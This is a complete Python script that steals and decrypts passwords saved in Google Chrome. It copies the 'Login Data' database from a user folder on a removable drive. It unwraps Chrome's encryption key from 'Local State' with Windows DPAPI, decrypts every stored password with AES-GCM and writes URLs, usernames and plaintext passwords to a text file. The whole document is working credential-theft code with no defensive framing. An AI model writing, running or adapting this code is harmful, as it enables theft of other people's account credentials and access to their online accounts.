
import sys, sqlite3,shutil, win32crypt, json, base64, subprocess
from Crypto.Cipher import AES


user = sys.argv[1]

subprocess = subprocess.Popen("wmic logicaldisk where drivetype=2 get deviceid", shell=True, stdout=subprocess.PIPE)
subprocess_return = subprocess.stdout.read().decode("utf-8")
drive = subprocess_return[subprocess_return.index(":")-1] + ":"


logdata_path = drive + "/" + user + "/Login Data"
shutil.copy2(logdata_path, drive + "/" +user+"/Loginvault.db")

#Connect to sqlite database
conn = sqlite3.connect(drive + "/" + user + "/Loginvault.db")
cursor = conn.cursor()


try:
    #(1) Get secretkey from chrome local state
    with open( drive + "/" + user + "/Local State", "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    #Remove suffix DPAPI
    secret_key = secret_key[5:] 
    secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
except Exception as e:
    print("%s"%str(e))
    print("[ERR] Chrome secretkey cannot be found")


f = open(drive + "/" + user  + "/PlainTextLOL.txt", "w")

cursor.execute("SELECT action_url, username_value, password_value FROM logins")
for index,login in enumerate(cursor.fetchall()):
    url = login[0]
    username = login[1]
    ciphertext= login[2]
    initialisation_vector = ciphertext[3:15]
    encrypted_password = ciphertext[15:-16]
    cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
    decrypted_pass = cipher.decrypt(encrypted_password)
    decrypted_pass = decrypted_pass.decode()

    f.write("URL: " + url + "\n" + "Username: " + username + "\n" + "Password: " + decrypted_pass + "\n\n")

f.close()